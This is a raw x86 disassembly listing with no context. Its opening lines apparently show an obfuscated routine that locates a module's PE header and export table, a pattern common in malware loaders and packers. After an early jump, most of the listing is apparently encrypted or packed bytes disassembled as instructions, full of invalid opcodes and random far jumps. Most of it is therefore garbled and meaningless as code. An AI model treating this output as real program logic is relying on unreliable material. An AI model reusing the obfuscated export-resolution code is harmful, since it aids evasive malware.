  419ce8:	lods   eax,DWORD PTR ds:[esi]
  419ce9:	jp     0x419cbb
  419ceb:	mov    al,0x8b
  419ced:	pop    ebp
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	ins    BYTE PTR es:[edi],dx
  419d84:	rcr    edx,1
  419d86:	sub    dh,ch
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0xcbd192c
  419d90:	xor    al,0x6
  419d92:	or     al,ah
  419d94:	addr16 cmc 
  419d96:	sub    cl,BYTE PTR [ebp+0x5f31c24]
  419d9c:	jnp    0x419d6f
  419d9e:	pushfw 
  419da0:	mov    bl,0xaf
  419da2:	sbb    BYTE PTR [ecx+0x486d40f3],ch
  419da8:	jle    0x419dcb
  419daa:	cmp    BYTE PTR [ebp+0x16],dl
  419dad:	out    0x3a,al
  419daf:	xor    bh,dh
  419db1:	jno    0x419df4
  419db3:	scas   eax,DWORD PTR es:[edi]
  419db4:	dec    esi
  419db5:	pop    ss
  419db6:	test   esp,esp
  419db8:	gs and eax,0xf1596411
  419dbe:	icebp  
  419dbf:	ficom  DWORD PTR [esi+eax*8-0x4d320943]
  419dc6:	sub    DWORD PTR [edi+0x22],ebp
  419dc9:	aad    0x26
  419dcb:	cmp    al,0xd9
  419dcd:	fwait
  419dce:	outs   dx,DWORD PTR ds:[esi]
  419dcf:	(bad)  
  419dd0:	jmp    FWORD PTR ds:0xfe751c02
  419dd6:	cld    
  419dd7:	sar    DWORD PTR [esi+0x59ad2a71],cl
  419ddd:	xchg   DWORD PTR [ebx],eax
  419ddf:	mov    eax,ds:0x44b120c
  419de4:	inc    edi
  419de5:	loop   0x419dc2
  419de7:	xchg   ebx,eax
  419de8:	ret    
  419de9:	call   DWORD PTR [edx+0x474f458e]
  419def:	lods   eax,DWORD PTR ds:[esi]
  419df0:	xlat   BYTE PTR ds:[ebx]
  419df1:	cdq    
  419df2:	xor    edi,0x6120c4cb
  419df8:	or     BYTE PTR es:[ebx],0x9b
  419dfc:	jbe    0x419d87
  419dfe:	cmp    DWORD PTR [ebp-0x1043a6eb],esi
  419e04:	test   BYTE PTR cs:[ebp-0x74],0x96
  419e09:	mov    WORD PTR [esi+0x62218ff2],es
  419e0f:	shl    BYTE PTR [edi+0xf1c9cda],cl
  419e15:	mov    ch,0xed
  419e17:	or     dh,BYTE PTR [ebx]
  419e19:	sub    eax,0x8f908e5d
  419e1e:	adc    eax,0xa42c55b2
  419e23:	lods   eax,DWORD PTR ds:[esi]
  419e24:	jne    0x419e4a
  419e26:	mov    esi,0xddf351f5
  419e2b:	or     DWORD PTR [eax-0x46556631],esi
  419e31:	daa    
  419e32:	xor    bl,bl
  419e34:	adc    esp,DWORD PTR ds:0xf7bbd7e5
  419e3a:	les    ebp,FWORD PTR [edi+0x3a]
  419e3d:	int3   
  419e3e:	xchg   edi,eax
  419e3f:	sub    DWORD PTR [edi+0x2caeb0cc],0x15
  419e46:	fwait
  419e47:	std    
  419e48:	mov    edi,0xf0b27aa4
  419e4d:	jle    0x419e29
  419e4f:	jo     0x419e13
  419e51:	cli    
  419e52:	inc    esi
  419e53:	call   0xdf355cc
  419e58:	mov    bh,0xc7
  419e5a:	mov    DWORD PTR [edx+0x46],ebp
  419e5d:	cdq    
  419e5e:	mov    edx,0xeff04ba4
  419e63:	nop
  419e64:	sub    BYTE PTR [edi+0x1c4804bd],ah
  419e6a:	mov    eax,ds:0x8dc824c8
  419e6f:	jmp    0x1d928c14
  419e74:	mov    ds:0xaf0580c8,eax
  419e79:	dec    esi
  419e7a:	rcr    DWORD PTR [eax],1
  419e7c:	iret   
  419e7d:	push   esi
  419e7e:	cwde   
  419e7f:	mov    ecx,0xf67ce1f0
  419e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e85:	pop    edi
  419e86:	jg     0x419e83
  419e88:	mov    ebx,0xeaa6224d
  419e8d:	int3   
  419e8e:	shl    BYTE PTR [esi],cl
  419e90:	aad    0xa8
  419e92:	nop
  419e93:	fild   QWORD PTR [ebx]
  419e95:	sbb    esp,DWORD PTR [eax+0xbcf0053]
  419e9b:	sub    DWORD PTR [edi],0x72d7d9e9
  419ea1:	add    DWORD PTR [ebx+0x52],esp
  419ea4:	or     al,0x25
  419ea6:	jp     0x419e30
  419ea8:	mov    eax,ds:0xfa78b3fc
  419ead:	push   0x77a6d33c
  419eb2:	inc    ebx
  419eb3:	adc    al,0x4f
  419eb5:	stos   DWORD PTR es:[edi],eax
  419eb6:	or     BYTE PTR [esi+esi*4+0x68d10b58],cl
  419ebd:	loopne 0x419e69
  419ebf:	sub    eax,0xf3148586
  419ec4:	lds    eax,FWORD PTR [ebp-0x461db45c]
  419eca:	or     bh,BYTE PTR [eax+0x3a49d175]
  419ed0:	daa    
  419ed1:	pop    ebx
  419ed2:	fdivr  QWORD PTR [eax+edx*4]
  419ed5:	fisttp QWORD PTR ds:0xecbe178b
  419edb:	add    al,0x9e
  419edd:	fisub  DWORD PTR [edi-0x73340d12]
  419ee3:	mov    eax,DWORD PTR [esi+0x5a]
  419ee6:	out    dx,al
  419ee7:	test   BYTE PTR [eax+0x72b77ed7],al
  419eed:	push   esi
  419eee:	ror    DWORD PTR [eax-0xc],1
  419ef1:	dec    esi
  419ef2:	aad    0x6c
  419ef4:	fld    QWORD PTR [esi]
  419ef6:	and    bh,BYTE PTR [ecx-0x14]
  419ef9:	loop   0x419edd
  419efb:	jae    0x419ed0
  419efd:	clc    
  419efe:	shl    DWORD PTR [ebx+eax*4],1
  419f01:	xor    BYTE PTR [esi+0x7b],cl
  419f04:	out    0x82,eax
  419f06:	in     al,0x1
  419f08:	inc    edx
  419f09:	mov    BYTE PTR [esi+0x36],bl
  419f0c:	xchg   edx,eax
  419f0d:	test   al,0xab
  419f0f:	mov    edx,0xf728a314
  419f14:	mov    al,ds:0xcdb3fa4e
  419f19:	push   ecx
  419f1a:	repnz fld TBYTE PTR [edi-0x7722b757]
  419f21:	pop    edx
  419f22:	jnp    0x419eb9
  419f24:	add    eax,0x864d1df6
  419f29:	pusha  
  419f2a:	xchg   ecx,eax
  419f2b:	and    ecx,ebx
  419f2d:	and    BYTE PTR [eax-0x5a],al
  419f30:	(bad)  
  419f31:	fidiv  WORD PTR [ebp-0x7ea866f4]
  419f37:	xchg   ecx,eax
  419f38:	sub    bl,BYTE PTR ds:0xb3e5d8b4
  419f3e:	or     eax,0x506ebaf4
  419f43:	mov    edx,0xa309bfe7
  419f48:	push   ebx
  419f49:	inc    esp
  419f4a:	sti    
  419f4b:	sub    eax,0x8a7514b8
  419f50:	clc    
  419f51:	gs jae 0x419f47
  419f54:	xchg   esi,eax
  419f55:	dec    edx
  419f56:	out    0xb6,eax
  419f58:	push   edi
  419f59:	push   0x6cb981b7
  419f5e:	into   
  419f5f:	push   edi
  419f60:	jnp    0x419efc
  419f62:	pop    edx
  419f63:	aad    0xe6
  419f65:	pop    esp
  419f66:	or     BYTE PTR [eax+0x23],ah
  419f69:	jb     0x419f3b
  419f6b:	call   DWORD PTR [ebp+0x6d]
  419f6e:	inc    ebp
  419f6f:	int    0x74
  419f71:	test   DWORD PTR [ebx],esi
  419f73:	cmp    BYTE PTR [eax+0x45ea8c5b],0x6d
  419f7a:	xchg   ebx,eax
  419f7b:	(bad)  
  419f7c:	mov    BYTE PTR [edi-0x4f],bh
  419f7f:	mov    bh,0x75
  419f81:	xchg   esi,eax
  419f82:	fcmove st,st(3)
  419f84:	pop    edx
  419f85:	fnstcw WORD PTR [ecx]
  419f87:	jne    0x419ffb
  419f89:	sbb    DWORD PTR [ecx-0xb],ecx
  419f8c:	iret   
  419f8d:	pop    ss
  419f8e:	jo     0x419fef
  419f90:	ror    DWORD PTR [ebx-0x3008a4aa],cl
  419f96:	mov    BYTE PTR [ecx],dl
  419f98:	sub    ebp,edi
  419f9a:	adc    eax,0x1f5fbf02
  419f9f:	loop   0x419f90
  419fa1:	mov    ecx,0x4e40b4f5
  419fa6:	dec    ebx
  419fa7:	(bad)  
  419fa8:	fwait
  419fa9:	das    
  419faa:	rcr    BYTE PTR [ebp-0x56b0d2c4],0xe4
  419fb1:	and    ch,BYTE PTR ds:0x45d4797f
  419fb7:	mov    edx,DWORD PTR [edi-0x12]
  419fba:	xchg   esi,eax
  419fbb:	and    al,0xd1
  419fbd:	cmp    DWORD PTR [eax+eax*1],0x9f19d225
  419fc4:	cld    
  419fc5:	pop    ebx
  419fc6:	clc    
  419fc7:	mov    edx,0x25675b18
  419fcc:	sub    dl,BYTE PTR [esi-0x65]
  419fcf:	ja     0x419fff
  419fd1:	int    0x94
  419fd3:	cli    
  419fd4:	or     ebp,DWORD PTR [ecx-0x704c8dd3]
  419fda:	xlat   BYTE PTR ds:[ebx]
  419fdb:	in     al,0xca
  419fdd:	mov    al,ds:0xde555e25
  419fe2:	mov    esi,0x12a435f1
  419fe7:	or     al,0x5f
  419fe9:	and    eax,0x10b853e5
  419fee:	call   0xf9f21088
  419ff3:	int    0xc5
  419ff5:	sub    esi,DWORD PTR [edx+0x7b]
  419ff8:	pcmpeqd mm6,mm7
  419ffb:	sbb    al,0xe1
  419ffd:	xchg   esi,eax
  419ffe:	loopne 0x41a07d
  41a000:	xchg   edx,eax
  41a001:	pop    edi
  41a002:	aad    0x3d
  41a004:	les    edx,FWORD PTR [edi-0x72123cf]
  41a00a:	pop    eax
  41a00b:	ret    
  41a00c:	mov    eax,ds:0x463a7f07
  41a011:	lock (bad) 
  41a014:	ret    0x3b74
  41a017:	pop    eax
  41a018:	pop    DWORD PTR ds:0x921d8684
  41a01e:	cmp    al,0x3b
  41a020:	add    al,0xf
  41a022:	call   0x58f811ee
  41a027:	in     al,0x9c
  41a029:	mul    edx
  41a02b:	sahf   
  41a02c:	push   eax
  41a02d:	jb     0x419fd3
  41a02f:	arpl   WORD PTR [edx+0x5c],bx
  41a032:	in     al,dx
  41a033:	sub    ecx,DWORD PTR [edi+0x3e814554]
  41a039:	(bad)  
  41a03a:	mov    ah,0xaa
  41a03c:	mov    esp,0xf81b3810
  41a041:	or     BYTE PTR [ecx+esi*1-0x7eb659de],cl
  41a048:	xchg   DWORD PTR ds:0x643d583a,ebp
  41a04e:	or     WORD PTR [ebx+0x1],si
  41a052:	arpl   bx,bp
  41a054:	add    bh,BYTE PTR [edx-0x5c66135a]
  41a05a:	xchg   edi,eax
  41a05b:	popa   
  41a05c:	test   al,0xac
  41a05e:	pusha  
  41a05f:	add    al,0x17
  41a061:	jb     0x41a02e
  41a063:	and    al,0xaf
  41a065:	jae    0x41a04d
  41a067:	fbstp  TBYTE PTR [ebx-0x6de79f49]
  41a06d:	clc    
  41a06e:	mov    esp,0xdcafa3e8
  41a073:	sub    DWORD PTR [bx-0x14],0x8889e9f7
  41a07b:	xor    al,0xe6
  41a07d:	pop    edx
  41a07e:	pushf  
  41a07f:	mov    eax,0x8070458a
  41a084:	xlat   BYTE PTR ds:[ebx]
  41a085:	or     ebp,edx
  41a087:	dec    ecx
  41a088:	xchg   si,ax
  41a08a:	(bad)  
  41a08b:	adc    dh,BYTE PTR [ebx]
  41a08d:	or     eax,DWORD PTR [ebp-0x54]
  41a090:	jo     0x41a051
  41a092:	push   esi
  41a093:	jl     0x41a0f0
  41a095:	mov    eax,0xde66b36f
  41a09a:	popf   
  41a09b:	cmp    al,0x33
  41a09d:	into   
  41a09e:	(bad)  
  41a09f:	jle    0x41a023
  41a0a1:	gs xor eax,0x59c2961d
  41a0a7:	jg     0x41a11b
  41a0a9:	retf   
  41a0aa:	mov    WORD PTR [edi],?
  41a0ac:	sti    
  41a0ad:	or     DWORD PTR [edx],0x12
  41a0b0:	jge    0x41a117
  41a0b2:	cli    
  41a0b3:	push   esi
  41a0b4:	pop    eax
  41a0b5:	push   cs
  41a0b6:	cmp    al,0x55
  41a0b8:	mov    al,ds:0x2cfc39bc
  41a0bd:	rep ins WORD PTR es:[edi],dx
  41a0c0:	mov    ch,0xdf
  41a0c2:	aad    0xd0
  41a0c4:	repnz push DWORD PTR [ecx-0x44]
  41a0c8:	jnp    0x41a146
  41a0ca:	mov    ah,0xf0
  41a0cc:	(bad)  
  41a0cd:	(bad)  [eax-0x5af38da8]
  41a0d3:	(bad)  
  41a0d4:	hlt    
  41a0d5:	retf   0x16ca
  41a0d8:	jno    0x41a0f0
  41a0da:	add    DWORD PTR [ebp-0x3bc205e6],0xad5807ee
  41a0e4:	jnp    0x41a152
  41a0e6:	xor    dl,ch
  41a0e8:	pop    edi
  41a0e9:	xchg   ecx,eax
  41a0ea:	imul   ebp,DWORD PTR [edi],0xc56d705c
  41a0f0:	test   eax,0xb70dc076
  41a0f5:	in     al,dx
  41a0f6:	(bad)  
  41a0f9:	and    al,0x3a
  41a0fb:	jg     0x41a126
  41a0fd:	mov    ebp,0x30f81c3c
  41a102:	neg    DWORD PTR [ebx+0x29]
  41a105:	add    eax,0x9f3b88dd
  41a10a:	jb     0x41a156
  41a10c:	pop    edi
  41a10d:	fdivr  QWORD PTR [edx+0x79b991ef]
  41a113:	(bad)  [ecx+0x56]
  41a116:	cdq    
  41a117:	fucomip st,st(1)
  41a119:	sbb    cl,0x56
  41a11c:	(bad)  
  41a11d:	adc    DWORD PTR [ecx-0x70],ebx
  41a120:	or     dh,bl
  41a122:	xor    edx,eax
  41a124:	sub    ah,cl
  41a126:	not    DWORD PTR [ebx]
  41a128:	mov    esi,0xb6039798
  41a12d:	add    BYTE PTR [edi-0x4d],al
  41a130:	lahf   
  41a131:	(bad)  
  41a132:	jmp    0x41a11d
  41a134:	dec    esi
  41a135:	(bad)  
  41a136:	dec    eax
  41a137:	mov    BYTE PTR [ecx-0x6],ch
  41a13a:	jle    0x41a193
  41a13c:	scas   eax,DWORD PTR es:[edi]
  41a13d:	inc    esi
  41a13e:	pushf  
  41a13f:	fild   WORD PTR [edx]
  41a141:	out    0x7a,eax
  41a143:	mov    eax,0xededff48
  41a148:	mov    ecx,0xa215fca5
  41a14d:	enter  0x85e6,0x21
  41a151:	outs   dx,DWORD PTR ds:[esi]
  41a152:	and    al,0x4c
  41a154:	in     al,dx
  41a155:	pop    ds
  41a156:	inc    esi
  41a157:	leave  
  41a158:	mov    edx,0xa563a9c4
  41a15d:	in     al,0xe0
  41a15f:	sbb    ebx,DWORD PTR [esi]
  41a161:	sub    eax,0x926fb8c3
  41a166:	sbb    esi,DWORD PTR fs:[ebx-0x3dae325]
  41a16d:	or     eax,0x7e72cc53
  41a172:	aaa    
  41a173:	xor    al,0xf3
  41a175:	pop    esi
  41a176:	clc    
  41a177:	xchg   DWORD PTR [ecx+0x72],edx
  41a17a:	xor    al,0x7f
  41a17c:	xor    bh,ah
  41a17e:	je     0x41a148
  41a180:	and    eax,0xf7c05bb7
  41a185:	xchg   edx,eax
  41a186:	dec    ecx
  41a187:	jle    0x41a16e
  41a189:	int    0x41
  41a18b:	out    0xa9,al
  41a18d:	lea    ebx,ds:0x681aa994
  41a193:	dec    esp
  41a194:	sbb    DWORD PTR [ecx+0x32],edi
  41a197:	out    0x8d,eax
  41a199:	and    esi,ecx
  41a19b:	in     al,dx
  41a19c:	cli    
  41a19d:	(bad)  
  41a19f:	sbb    al,0xdf
  41a1a1:	mov    cl,0xdc
  41a1a3:	loope  0x41a1c1
  41a1a5:	jmp    0xec51:0xa8c5c7bb
  41a1ac:	jle    0x41a1e2
  41a1ae:	and    al,BYTE PTR [ebx+0x78c24a6e]
  41a1b4:	xchg   esi,eax
  41a1b5:	xchg   BYTE PTR [esi+edx*2-0x3ead44c4],ah
  41a1bc:	mov    ds:0x3e6aa94c,al
  41a1c1:	xor    DWORD PTR [edx+0x5f],0xa77a782b
  41a1c8:	iret   
  41a1c9:	ss es scas eax,DWORD PTR es:[edi]
  41a1cc:	or     ecx,DWORD PTR [edx+0x28]
  41a1cf:	xchg   ebp,eax
  41a1d0:	das    
  41a1d1:	push   0xffffffd4
  41a1d3:	stc    
  41a1d4:	je     0x41a192
  41a1d6:	pop    ebp
  41a1d7:	or     DWORD PTR ds:0x4e0b419a,edx
  41a1dd:	push   ebx
  41a1de:	hlt    
  41a1df:	scas   ax,WORD PTR es:[edi]
  41a1e1:	and    al,0x67
  41a1e3:	adc    bh,cl
  41a1e5:	popf   
  41a1e6:	fdiv   QWORD PTR [eax+0x4b]
  41a1e9:	xor    al,0xd5
  41a1eb:	xchg   DWORD PTR [esi+0x5ba1589d],ebx
  41a1f1:	stc    
  41a1f2:	push   cs
  41a1f3:	sbb    ah,BYTE PTR [ebx]
  41a1f5:	sub    esi,edi
  41a1f7:	xor    edi,DWORD PTR [ebx+0x7f]
  41a1fa:	cli    
  41a1fb:	sbb    ebx,DWORD PTR [eax+0x31]
  41a1fe:	add    DWORD PTR ds:0xfd4936f9,edx
  41a204:	retf   
  41a205:	push   esi
  41a206:	cmp    al,0x24
  41a208:	cmp    al,0x2c
  41a20a:	and    DWORD PTR [ebx-0x72616fc0],esi
  41a210:	sbb    ebp,DWORD PTR ds:0x48dfee07
  41a216:	(bad)  
  41a217:	aas    
  41a218:	leave  
  41a219:	mov    al,0xab
  41a21b:	and    eax,0x2e1a94d8
  41a220:	sub    BYTE PTR [edx],bl
  41a222:	nop
  41a223:	sbb    eax,0xd7b21ffb
  41a228:	stos   DWORD PTR es:[edi],eax
  41a229:	sbb    esi,DWORD PTR [esi+0xc628ef]
  41a22f:	mov    ds:0x3e6c9251,eax
  41a234:	cdq    
  41a235:	sub    ebp,DWORD PTR [ebx]
  41a237:	bsr    ebx,DWORD PTR [edi]
  41a23a:	xchg   ecx,eax
  41a23b:	jle    0x41a25a
  41a23d:	add    ebx,DWORD PTR [eax]
  41a23f:	hlt    
  41a240:	pop    edi
  41a241:	sti    
  41a242:	sbb    al,0x55
  41a244:	enter  0xb4e3,0x5d
  41a248:	pop    esp
  41a249:	mov    ?,WORD PTR [ebp-0x71]
  41a24c:	add    BYTE PTR [edx+0x60bcc6e9],dl
  41a252:	enter  0x824d,0x98
  41a256:	not    DWORD PTR [edx+ebx*1]
  41a259:	sub    cl,BYTE PTR [eax]
  41a25b:	pusha  
  41a25c:	stos   BYTE PTR es:[edi],al
  41a25d:	jnp    0x41a290
  41a25f:	jo     0x41a25a
  41a261:	cmc    
  41a262:	outs   dx,DWORD PTR ds:[esi]
  41a263:	push   esi
  41a264:	inc    edx
  41a265:	loop   0x41a2de
  41a267:	pop    ds
  41a268:	hlt    
  41a269:	cmp    eax,0x2595f79c
  41a26e:	pushf  
  41a26f:	and    eax,0xdd692009
  41a274:	test   al,0xd0
  41a276:	leave  
  41a277:	mov    BYTE PTR [edx-0x3c867c1a],bh
  41a27d:	lea    edx,[ebx-0x294f7c2e]
  41a283:	dec    edi
  41a284:	call   0x1c16:0xb3e89823
  41a28b:	call   0x6388:0xbc6c675f
  41a292:	inc    esi
  41a293:	mov    edx,0x2af761b7
  41a298:	and    cl,BYTE PTR [eax]
  41a29a:	aad    0x67
  41a29c:	mov    ah,0xb1
  41a29e:	data16 shl bh,1
  41a2a1:	pop    eax
  41a2a2:	in     eax,0xfd
  41a2a4:	push   esi
  41a2a5:	sub    eax,0x20754cef
  41a2aa:	mov    ah,0xd9
  41a2ac:	add    esp,DWORD PTR [edx+0x3b5779bf]
  41a2b2:	pushf  
  41a2b3:	mov    BYTE PTR ds:0xa4d4aa4c,dh
  41a2b9:	push   ds
  41a2ba:	jns    0x41a291
  41a2bc:	test   al,0x18
  41a2be:	das    
  41a2bf:	sbb    esp,DWORD PTR [edi]
  41a2c1:	neg    dl
  41a2c3:	dec    esp
  41a2c4:	pop    es
  41a2c5:	jp     0x41a2d2
  41a2c7:	push   ecx
  41a2c8:	mov    ch,0x71
  41a2ca:	mov    dl,0x5
  41a2cc:	mov    ebp,DWORD PTR [edi-0x35]
  41a2cf:	cld    
  41a2d0:	jg     0x41a28e
  41a2d2:	movq   QWORD PTR [ebx-0x6c],xmm6
  41a2d7:	jl     0x41a28d
  41a2d9:	xchg   edi,eax
  41a2da:	xchg   esi,eax
  41a2db:	scas   al,BYTE PTR es:[edi]
  41a2dc:	pop    ebx
  41a2dd:	out    0xd6,eax
  41a2df:	nop
  41a2e0:	mov    fs,WORD PTR [ecx-0x2915efa0]
  41a2e6:	push   eax
  41a2e7:	jo     0x41a346
  41a2e9:	retf   0x4947
  41a2ec:	xor    bh,ch
  41a2ee:	push   0xdcdf4ab8
  41a2f3:	je     0x41a275
  41a2f5:	out    dx,eax
  41a2f6:	cmp    dl,ah
  41a2f8:	push   0xffffffe6
  41a2fa:	sbb    eax,0x8d785bb3
  41a2ff:	ret    0x41c0
  41a302:	pop    edx
  41a303:	imul   ebp,DWORD PTR gs:[ecx+0x7],0xffffff98
  41a308:	mov    BYTE PTR [edx],ch
  41a30a:	fist   DWORD PTR [ecx+eax*1]
  41a30d:	jmp    0x41a2e3
  41a30f:	mov    cl,0x7a
  41a311:	jl     0x41a2c4
  41a313:	push   0x1b
  41a315:	cdq    
  41a316:	dec    eax
  41a317:	adc    al,0xc
  41a319:	xchg   edi,eax
  41a31a:	addr16 xchg esi,eax
  41a31c:	leave  
  41a31d:	mov    cl,0xb1
  41a31f:	and    al,0x0
  41a321:	mov    eax,0xb8295923
  41a326:	mov    ebx,0x53856600
  41a32b:	fstp   TBYTE PTR [eax]
  41a32d:	fidivr WORD PTR [ecx+0x76]
  41a330:	xchg   ebp,eax
  41a331:	jecxz  0x41a388
  41a333:	and    eax,0x145db343
  41a338:	xor    al,0x89
  41a33a:	pop    ebp
  41a33b:	jl     0x41a307
  41a33d:	mov    edi,0xccaba8d6
  41a342:	loop   0x41a31c
  41a344:	adc    eax,0xcd7f1857
  41a349:	push   0x2da1759a
  41a34e:	inc    esp
  41a34f:	or     esp,DWORD PTR [ebx]
  41a351:	imul   ebp,ebp,0xfaa9f6b6
  41a357:	push   ds
  41a358:	mov    ebp,0x9cae6c15
  41a35d:	pop    esi
  41a35e:	mov    bh,BYTE PTR [edx-0x2ffc6d7f]
  41a364:	dec    eax
  41a365:	cs push ecx
  41a367:	sbb    al,0x85
  41a369:	push   esi
  41a36a:	add    esi,edx
  41a36c:	(bad)  
  41a36d:	mov    al,es:0x132bf43e
  41a373:	inc    edx
  41a374:	in     eax,dx
  41a375:	int3   
  41a376:	adc    dh,BYTE PTR [ebp+0x7e]
  41a379:	sub    al,ah
  41a37b:	sub    cl,dh
  41a37d:	es inc esp
  41a37f:	in     al,0x58
  41a381:	push   esp
  41a382:	pop    esi
  41a383:	xchg   ecx,eax
  41a384:	nop
  41a385:	or     al,0xe2
  41a387:	pop    esi
  41a388:	scas   eax,DWORD PTR es:[edi]
  41a389:	push   ecx
  41a38a:	sbb    eax,0xfd2ac5bd
  41a38f:	pop    esi
  41a390:	bound  eax,QWORD PTR [ebp+0x5a9a0f22]
  41a396:	or     esp,DWORD PTR [ecx+0x5f]
  41a399:	jmp    0x41a3ee
  41a39b:	repnz or al,0x75
  41a39e:	(bad)  
  41a39f:	jmp    0x9efd64f3
  41a3a4:	mov    ebx,0xc5234f3f
  41a3a9:	and    dh,BYTE PTR [edi-0x635e6251]
  41a3af:	(bad)
  41a3b4:	jle    0x41a3a9
  41a3b6:	pop    ss
  41a3b7:	jle    0x41a3fc
  41a3b9:	or     eax,0x4b986393
  41a3be:	push   ebp
  41a3bf:	mov    ebx,0xe791edc2
  41a3c4:	and    al,0xd6
  41a3c6:	mov    eax,ds:0xb0af1b3a
  41a3cb:	mov    ecx,0x5e9c38da
  41a3d0:	and    al,0x6e
  41a3d2:	jmp    0x36fb48c0
  41a3d7:	ret    0x938a
  41a3da:	dec    ebx
  41a3db:	bound  esp,QWORD PTR [ecx+0x29fbe77c]
  41a3e1:	pop    DWORD PTR [eax]
  41a3e3:	dec    esi
  41a3e4:	or     edi,DWORD PTR [edx-0x11b5270a]
  41a3ea:	cli    
  41a3eb:	adc    al,al
  41a3ed:	pop    edi
  41a3ee:	scas   al,BYTE PTR es:[edi]
  41a3ef:	shl    dl,1
  41a3f1:	es jmp 0x2f778327
  41a3f7:	pop    esp
  41a3f8:	sub    al,0x98
  41a3fa:	fmul   QWORD PTR [esi+0x5e2e920b]
  41a400:	add    eax,0xde7e274
  41a405:	xlat   BYTE PTR ds:[ebx]
  41a406:	sbb    edi,ecx
  41a408:	xchg   DWORD PTR [esi-0x1d],eax
  41a40b:	cmp    BYTE PTR [eax-0x6],al
  41a40e:	dec    edi
  41a40f:	push   eax
  41a410:	inc    esp
  41a411:	xor    eax,0x5e9ce50d
  41a416:	adc    DWORD PTR [ebp-0x5b],esp
  41a419:	pop    eax
  41a41a:	jno    0x41a480
  41a41c:	in     eax,dx
  41a41d:	dec    ebp
  41a41e:	leave  
  41a41f:	enter  0xec1d,0x1c
  41a423:	dec    ebp
  41a424:	mov    al,ds:0xd4ad0d0f
  41a429:	pop    eax
  41a42a:	mov    ds:0xc88e51a3,al
  41a42f:	mov    ds:0xee162f6d,al
  41a434:	push   cs
  41a435:	pop    edi
  41a436:	fs dec esp
  41a438:	inc    ebp
  41a439:	(bad)  
  41a43a:	mov    esi,0x6591405b
  41a43f:	icebp  
  41a440:	cs in  eax,0x15
  41a443:	or     eax,0xeabc94d2
  41a448:	fdivrp st(7),st
  41a44a:	leave  
  41a44b:	aaa    
  41a44c:	or     DWORD PTR [edx-0x5f17eadc],0x2e6df2a5
  41a456:	push   eax
  41a457:	sbb    BYTE PTR [eax-0x70],0x63
  41a45b:	xor    dl,BYTE PTR [esi+ebx*1-0x1c]
  41a45f:	adc    al,0xa4
  41a461:	pop    esp
  41a462:	or     ebx,DWORD PTR [edx]
  41a464:	jns    0x41a49b
  41a466:	nop
  41a467:	lds    eax,FWORD PTR [edi]
  41a469:	clc    
  41a46a:	inc    ebp
  41a46b:	outs   dx,DWORD PTR ds:[esi]
  41a46c:	cdq    
  41a46d:	and    edi,DWORD PTR [edi]
  41a46f:	jne    0x41a3f5
  41a471:	add    ah,BYTE PTR ds:0x70a4cf9d
  41a477:	push   ds
  41a478:	or     al,BYTE PTR [ecx-0x31]
  41a47b:	shr    DWORD PTR [edi-0x594033fb],0xcd
  41a482:	sbb    ebp,eax
  41a484:	and    BYTE PTR [eax],0x1c
  41a487:	ror    BYTE PTR [ebp+0x6bc789],0x7d
  41a48e:	xor    eax,0xf4fe5332
  41a493:	sbb    BYTE PTR [esi],dl
  41a495:	popf   
  41a496:	outs   dx,BYTE PTR ds:[esi]
  41a497:	sub    al,0x76
  41a499:	add    al,0x87
  41a49b:	fmul   st(4),st
  41a49d:	sbb    eax,0xcefe9a01
  41a4a2:	mov    ch,0xcf
  41a4a4:	pop    eax
  41a4a5:	outs   dx,DWORD PTR ds:[esi]
  41a4a6:	addr16 inc esi
  41a4a8:	dec    edx
  41a4a9:	sub    eax,0xaf8657c3
  41a4ae:	mov    ebx,0xf7fdcc5
  41a4b3:	daa    
  41a4b4:	(bad)  
  41a4b5:	rol    DWORD PTR [ebx-0x47fb5f54],0x49
  41a4bc:	div    BYTE PTR [edx-0x7f22622c]
  41a4c2:	sbb    BYTE PTR [edi+esi*1-0x12],al
  41a4c6:	adc    eax,DWORD PTR [edx-0x39]
  41a4c9:	hlt    
  41a4ca:	xor    BYTE PTR [ecx+0x5ae2bd69],ch
  41a4d0:	arpl   WORD PTR [edx],bx
  41a4d2:	mov    esp,0x92a2a20a
  41a4d7:	xchg   DWORD PTR [edx],esp
  41a4d9:	inc    ecx
  41a4da:	mov    BYTE PTR [ebx],al
  41a4dc:	stc    
  41a4dd:	retf   
  41a4de:	jo     0x41a55d
  41a4e0:	mov    BYTE PTR fs:[edx],0x98
  41a4e4:	data16 jne 0x41a4a4
  41a4e7:	lahf   
  41a4e8:	sub    DWORD PTR [edx+0x25],esp
  41a4eb:	pop    ebx
  41a4ec:	push   ss
  41a4ed:	sbb    DWORD PTR [esi-0x6e],edx
  41a4f0:	sbb    edi,esp
  41a4f2:	test   eax,0x7a91bcbb
  41a4f7:	dec    edi
  41a4f8:	and    ebp,DWORD PTR [ecx-0x3]
  41a4fb:	push   edi
